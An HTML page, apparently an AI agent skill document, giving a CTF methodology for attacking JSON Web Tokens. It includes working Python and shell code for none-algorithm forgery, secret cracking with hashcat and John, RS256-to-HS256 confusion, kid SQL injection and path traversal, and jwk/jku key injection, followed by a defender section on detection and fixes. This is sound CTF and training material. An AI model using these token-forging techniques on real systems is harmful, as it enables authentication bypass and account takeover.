@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ctf-web-challenges-jwt-challenges</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ctf-web-challenges-jwt-challenges</h2><div class="meta"><span class="badge gray">ctf</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when a CTF web challenge uses JSON Web Tokens for</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><div class="deps"><span class="kind">requires:</span> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>curl</td><td>8.5</td></tr><tr><td>John the Ripper</td><td>1.9.0-jumbo</td></tr></tbody></table><p>JWT challenges test whether you understand how token verification can fail. The attacks form a short ladder: none algorithm, weak secret, algorithm confusion, key confusion via <code>kid</code>, and trusted-key injection via <code>jwk</code>/<code>jku</code>. This sub-skill covers the authorized methodology for each, with Python snippets for crafting tokens and the exact order to try them in a competition. Scope is CTF competitions, lab apps, and systems you have explicit permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Capture a valid token (login, register) and decode header and</li>
+<p>payload; note <code>alg</code>, <code>kid</code>, <code>jku</code>, and claim names.</p>
+<li>Read the verification code in source when provided; the bug is</li>
+<p>usually one line (<code>algorithms=[&quot;none&quot;]</code>, hardcoded secret).</p>
+<li>Try the none algorithm: set <code>alg</code> to <code>none</code>, empty the signature,</li>
+<p>escalate the claims.</p>
+<li>If a secret is used, brute force it with a wordlist (HS256 secrets</li>
+<p>in CTFs are weak by design).</p>
+<li>If <code>alg</code> is RS256 and you have the public key, try algorithm</li>
+<p>confusion (sign HS256 with the public key as secret).</p>
+<li>If a <code>kid</code> header exists, test it for SQL injection or path</li>
+<p>traversal in the key lookup.</p>
+<li>If <code>jku</code>/<code>jwk</code> are honored, inject your own key.</li>
+<li>Craft the admin token, replay it, and capture the flag.</li>
+</ol>
+<h2>1. Decoding and baseline crafting</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+import base64, json, hmac, hashlib
+
+def b64d(s): return base64.urlsafe_b64decode(s + &quot;=&quot; * (-len(s) % 4))
+def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b&quot;=&quot;).decode()
+
+token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxxx&quot;
+header, payload, sig = token.split(&quot;.&quot;)
+print(&quot;header:&quot;, json.loads(b64d(header)))
+print(&quot;payload:&quot;, json.loads(b64d(payload)))
+
+def forge(payload_dict, secret, alg=&quot;HS256&quot;):
+    h = b64e(json.dumps({&quot;alg&quot;: alg, &quot;typ&quot;: &quot;JWT&quot;}).encode())
+    p = b64e(json.dumps(payload_dict).encode())
+    s = b64e(hmac.new(secret, f&quot;{h}.{p}&quot;.encode(), hashlib.sha256).digest())
+    return f&quot;{h}.{p}.{s}&quot;
+
+# example: escalate role with a known secret
+print(forge({&quot;user&quot;: &quot;guest&quot;, &quot;role&quot;: &quot;admin&quot;}, b&quot;secret&quot;))</code></pre>
+<p>Keep a valid baseline token; every attack is a mutation of it. Test each forged token with curl against the protected endpoint and diff the response.</p>
+<h2>2. The none algorithm attack</h2>
+<pre><code class="language-python"># strip the signature, set alg to none
+h = b64e(json.dumps({&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;}).encode())
+p = b64e(json.dumps({&quot;user&quot;: &quot;guest&quot;, &quot;role&quot;: &quot;admin&quot;}).encode())
+none_token = f&quot;{h}.{p}.&quot;   # trailing dot, empty signature
+print(none_token)</code></pre>
+<pre><code class="language-bash">curl -s http://chals.ctf:8000/admin -H &quot;Cookie: token=$NONE_TOKEN&quot; | head -c 300
+# variants to try: &quot;none&quot;, &quot;None&quot;, &quot;NONE&quot; (case handling bugs)</code></pre>
+<p>This works when the verifier trusts the token&#x27;s own <code>alg</code> claim. Source tells you instantly: <code>jwt.decode(t, verify=False)</code> or an allowlist that includes <code>&quot;none&quot;</code>.</p>
+<h2>3. Weak secret brute force</h2>
+<pre><code class="language-bash"># hashcat mode 16500 cracks JWT HS256 secrets from a captured token
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force
+
+# or John the Ripper with the jwt2john converter
+python3 /usr/share/john/jwt2john.py &quot;$TOKEN&quot; &gt; jwt.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash</code></pre>
+<p>CTF secrets are deliberately weak (<code>secret</code>, <code>password</code>, <code>ctf</code>, <code>challenge</code>, <code>123456</code>, the challenge name). Once cracked, forge any claims with the snippet in section 1. If the wordlist fails quickly, move on; the intended bug is usually elsewhere on the ladder.</p>
+<h2>4. RS256 to HS256 algorithm confusion</h2>
+<p>When the app verifies RS256 (asymmetric) but you can get it to accept HS256 (symmetric), sign with the RSA public key as the HMAC secret.</p>
+<pre><code class="language-python">from cryptography.hazmat.primitives import serialization
+import base64, json, hmac, hashlib
+
+# public key from the challenge (often at /.well-known/jwks.json or in source)
+pub_pem = open(&quot;pubkey.pem&quot;, &quot;rb&quot;).read()
+# use the PEM bytes themselves as the HMAC secret (classic confusion)
+secret = pub_pem
+
+def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b&quot;=&quot;).decode()
+h = b64e(json.dumps({&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}).encode())
+p = b64e(json.dumps({&quot;user&quot;: &quot;guest&quot;, &quot;role&quot;: &quot;admin&quot;}).encode())
+s = b64e(hmac.new(secret, f&quot;{h}.{p}&quot;.encode(), hashlib.sha256).digest())
+print(f&quot;{h}.{p}.{s}&quot;)</code></pre>
+<p>Variants: some apps strip PEM headers before using the key as secret; try the raw base64 body too. Confirm the app actually switches algorithms (source shows <code>algorithms=[&quot;RS256&quot;,&quot;HS256&quot;]</code> or reads <code>alg</code> from the header).</p>
+<h2>5. kid header attacks</h2>
+<p>The <code>kid</code> (key ID) header often selects the verification key from a database or filesystem, which makes it an injection point.</p>
+<pre><code class="language-bash"># Decode the header first; if kid looks like a filename or DB key, probe:
+# SQL injection via kid (when the key lookup is a query)
+# header: {&quot;alg&quot;:&quot;HS256&quot;,&quot;kid&quot;:&quot;key1&quot;} -&gt; {&quot;alg&quot;:&quot;HS256&quot;,&quot;kid&quot;:&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;}
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import base64, json
+def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b&quot;=&quot;).decode()
+h = b64e(json.dumps({&quot;alg&quot;:&quot;HS256&quot;,&quot;kid&quot;:&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; -- &quot;}).encode())
+p = b64e(json.dumps({&quot;user&quot;:&quot;guest&quot;,&quot;role&quot;:&quot;admin&quot;}).encode())
+print(f&quot;{h}.{p}.&quot;)
+EOF
+
+# Path traversal via kid (when the key is read from a file)
+# kid: ../../dev/null  -&gt; empty key, then sign with empty secret
+# kid: /proc/self/environ or a known static file whose content you know</code></pre>
+<p>For file-based <code>kid</code>, point it at a file whose content you know (or an empty file like <code>/dev/null</code>), then forge the signature with that known content as the secret.</p>
+<h2>6. jwk and jku injection</h2>
+<p>If the verifier trusts <code>jwk</code> (embedded key) or <code>jku</code> (key URL) headers, supply your own key.</p>
+<pre><code class="language-python"># Generate an RSA key, embed the public part as jwk, sign with the private part
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import jwt  # PyJWT
+key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+pub = key.public_key()
+numbers = pub.public_numbers()
+jwk = {&quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: str(numbers.e), &quot;n&quot;: str(numbers.n),
+       &quot;kid&quot;: &quot;evil&quot;, &quot;alg&quot;: &quot;RS256&quot;}
+token = jwt.encode({&quot;user&quot;: &quot;guest&quot;, &quot;role&quot;: &quot;admin&quot;}, key, algorithm=&quot;RS256&quot;,
+                   headers={&quot;jwk&quot;: jwk, &quot;kid&quot;: &quot;evil&quot;})
+print(token)</code></pre>
+<p>For <code>jku</code>: host a JWKS file with your key and set <code>&quot;jku&quot;</code> to its URL; this needs the challenge network to allow egress to your host, so check the rules first.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The app checks <code>exp</code>/<code>nbf</code>: set expiry far in the future when</li>
+<p>forging; a correct signature with an expired claim still fails.</p>
+<li>Multiple audiences (<code>aud</code>): copy the exact <code>aud</code> value from the</li>
+<p>baseline token into forged tokens.</p>
+<li>The secret is strong and none/confusion fail: the intended bug is</li>
+<p>likely <code>kid</code> or <code>jwk</code>; do not burn the competition on rockyou.</p>
+<li>Cookies are HttpOnly: you cannot read the token via XSS, but you can</li>
+<p>still set it via response manipulation or just replay forged tokens with curl.</p>
+<li>The token is encrypted (JWE), not signed: that is a different</li>
+<p>challenge class (key management, not signature bypass).</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Every ladder step fails: re-read the verification code line by</li>
+<p>line; CTF JWT bugs are sometimes subtle (comparing <code>role == &quot;admin&quot;</code> after decoding without verifying, accepting expired tokens, using <code>jwt.decode</code> with <code>options={&quot;verify_signature&quot;: False}</code>).</p>
+<li>The key is fetched from a URL you cannot control: look for SSRF in</li>
+<p>the <code>jku</code> fetch or DNS rebinding if the rules allow; otherwise move on, the intended path is elsewhere.</p>
+<li>Token works locally but not remotely: clock skew on <code>exp</code>, or the</li>
+<p>remote uses a different secret; re-capture a fresh baseline token from the remote.</p>
+<li>Admin endpoint still denies with a valid admin token: the role</li>
+<p>claim may be named differently (<code>is_admin</code>, <code>permissions</code>); decode a real admin token if the challenge leaks one, or enumerate claim names from source.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see JWT attacks as tokens with <code>alg:none</code>, unusually young <code>iat</code> with escalated roles, bursts of token submissions (brute force), and <code>kid</code> values containing quotes or <code>../</code>. Monitoring for <code>alg:none</code> in production logs is a near-zero false positive detection. Durable fixes: explicit algorithm allowlist (never trust the token&#x27;s <code>alg</code>), strong random secrets or proper asymmetric keys, strict <code>exp</code>/<code>aud</code> validation, and never using <code>kid</code> in a query or file path without allowlisting.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-287 (Improper Authentication).</li>
+<li>CWE-327 (Use of a Broken or Risky Cryptographic Algorithm):</li>
+<p>algorithm confusion.</p>
+<li>CWE-89 (SQL Injection): via the kid header.</li>
+<li>RFC 7519 (JSON Web Token): https://datatracker.ietf.org/doc/html/rfc7519</li>
+<li>jwt_tool: https://github.com/ticarpi/jwt_tool</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
